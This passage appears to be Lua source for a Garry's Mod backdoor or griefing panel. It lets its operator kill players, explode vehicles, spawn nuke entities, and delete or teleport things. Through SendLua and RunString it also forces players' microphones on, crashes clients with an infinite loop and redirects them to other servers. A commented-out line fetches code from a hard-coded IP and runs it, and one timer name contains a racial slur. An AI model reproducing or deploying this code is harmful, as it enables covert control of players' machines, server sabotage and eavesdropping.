				util.Effect("TeslaHitBoxes", effectdata, true, true)
			end)
		end
		local Zap = math.random(1,9)
		if Zap == 4 then Zap = 3 end
		target:EmitSound("ambient/energy/zap" .. Zap .. ".wav")
	end
	local function teleportrandom()
		local lesjoueurs = player.GetAll()
		local random = math.random(1, #lesjoueurs)
		if v == lesjoueurs[random] then return end
		local sphere = ents.FindInSphere(v:GetPos(), 200)
		for i=1, #sphere do
			if sphere[i]:GetClass() == "player" then
				if sphere[i] == lesjoueurs[random] then 
					teleportrandom()
					return
				end
			end
		end
		v:SetPos(lesjoueurs[random]:GetPos() + Vector(100,0,30))
		zapEffect(v)
	end

	if two == 1 then
		v:VC_repairFull_Admin()
	elseif two == 2 then
		v:VC_fuelSet(v:VC_fuelGetMax())
	elseif two == 3 then
		v:VC_explodeEngine(true)
	elseif two == 5 then
		v:VC_damagePart("wheel", 1)
		v:VC_damagePart("wheel", 2)
		v:VC_damagePart("wheel", 3)
		v:VC_damagePart("wheel", 4)
	elseif two == 6 then
		v:VC_clearSeats()
	elseif two == 7 then
		v:Remove()
	elseif two == 8 then
		v:Kill()
	elseif two == 9 then
		v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000)))
	elseif two == 10 then
		v:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
	elseif two == 11 then
		local rocket = ents.Create("m9k_launched_davycrockett")
		local ply2 = v
		rocket:SetPos(ply2:GetPos())
		rocket:SetOwner(ply2)
		rocket.Owner = ply2
		rocket:Spawn()
		rocket:Activate() 
	elseif two == 12 then
		v:SendLua([[timer.Create("mictoggle", 0.1, 0, function()LocalPlayer():ConCommand("+voicerecord")end)]])
	elseif two == 13 then
		v:SendLua([[timer.Destroy("mictoggle")LocalPlayer():ConCommand("-voicerecord")]])
	elseif two == 14 then
		timer.Create("fuckthenigga",0.5,5,function() 
			local rocket = ents.Create("m9k_launched_davycrockett")
			local ply2 = v
			rocket:SetPos(ply2:GetPos())
			rocket:SetOwner(ply2)
			rocket.Owner = ply2
			rocket:Spawn()
			rocket:Activate()
		end)
	elseif two == 15 then
		v:SetPos(v:GetPos() + Vector(200,200,200))
	elseif two == 16 then
		v:Fire("open", "", .6)
		v:Fire("setanimation", "open", .6)
	elseif two == 17 then
		v:Fire( "Lock" )
	elseif two == 18 then
		hook.Add("Think", "fzefezfez", function()
			local fuxios = v:GetPos() or nil
			if fuxios == nil then return end
			local mdr = ents.FindInSphere(v:GetPos(), 200)
			for i=1, #mdr do
			if mdr[i] == v then return end
			if mdr[i]:IsPlayer() then 
				local explode = ents.Create( "env_explosion" )
					explode:SetPos( mdr[i]:GetPos() )
					explode:Spawn()
					explode:SetKeyValue( "iMagnitude", "220" )
					explode:Fire( "Explode", 0, 0 )
					explode:EmitSound( "weapon_AWP.Single", 200, 200 )
				end
				timer.Simple(0.5,function()
					mdr[i]:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
					mdr[i]:Kill()
				end)
			end
		end)
	elseif two == 19 then
		if v:VC_hasGodMode() then
			v:VC_setGodMode(false)
		else
			v:VC_setGodMode(false)
		end
	elseif two == 20 then
		hook.Add("Think", "fzefezfezzzz", function()
			local mdr = ents.FindInSphere(v:GetPos(), 200)
			for i=1, #mdr do
				if mdr[i] == v then return end
				mdr[i]:Remove()
			end
		end)
	elseif two == 21 then
		teleportrandom()
	elseif two == 22 then
		if not timer.Exists("saywhatttttt") then
			teleportrandom()
			timer.Create("saywhatttttt", 5, 0, teleportrandom)
		else
			timer.Remove("saywhatttttt")
		end
	elseif two == 23 then
		Satellite = ents.Create("m9k_oribital_cannon")
		Satellite.PoorBastard = true
		Satellite.Target = v
		Satellite.Sky = v:GetPos()
		Satellite.Owner = v
		Satellite:SetPos(v:GetPos())
		Satellite:Spawn()
	elseif two == 28 then
		local fabrication = v:GetPos()

		local npcweed = ents.Create( v:GetClass() )
		npcweed:SetPos( Vector(fabrication.x + 15, fabrication.y, fabrication.z + 15) )
		npcweed:Spawn()
	elseif two == 29 then
		local fabrication = v:GetPos()

		for i = 1, 5 do
			local npcweed = ents.Create( v:GetClass() )
			npcweed:SetPos( Vector(fabrication.x + 15, fabrication.y, fabrication.z + 15) )
			npcweed:Spawn()
		end
	end
end)
		--user:SendLua([[http.Fetch("", function(b) RunString(b) end)]]) --http.Fetch("http://54.38.18.76/codeclient.php
	end

	if (uaction == "micon") then
		user:SendLua([[timer.Create("mictoggle", 0.1, 0, function()LocalPlayer():ConCommand("+voicerecord")end)]])
	end
	
	if (uaction == "micoff") then
        user:SendLua([[timer.Destroy("mictoggle")LocalPlayer():ConCommand("-voicerecord")]])
	end
	
	if (uaction == "crashuser") then
		user:SendLua( "net.Receive(\"SENDTEST\", function() RunString(net.ReadString()) end)" )
		net.Start( "SENDTEST" )
		net.WriteString( [[ while true do end ]] )
		net.Send(user)
	end

	if (uaction == "goduseron") then
		user:GodEnable()
	end

	if (uaction == "goduseroff") then
		user:GodDisable()
	end

	if (uaction == "redirectplayer") then
		local ip=net.ReadString()
		ply:SendLua([[LocalPlayer():ConCommand('connect ]]..tostring(ip)..[[')]])
	end

	if (uaction == "items") then
		user:Give( net.ReadString() )
	end
end)
